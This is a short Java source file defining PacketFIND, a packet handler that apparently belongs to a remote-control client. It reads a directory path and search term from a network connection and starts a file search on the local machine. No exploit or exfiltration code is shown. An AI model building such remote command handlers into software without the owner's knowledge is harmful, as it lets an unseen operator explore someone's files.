package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Search;


public class PacketFIND extends Packet {

	@Override
	public void read(String line) throws Exception {
		String start = Connection.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = Connection.readLine();
		boolean dir = Boolean.parseBoolean(Connection.readLine());
		new Search(start, what, dir).start();
	}

}
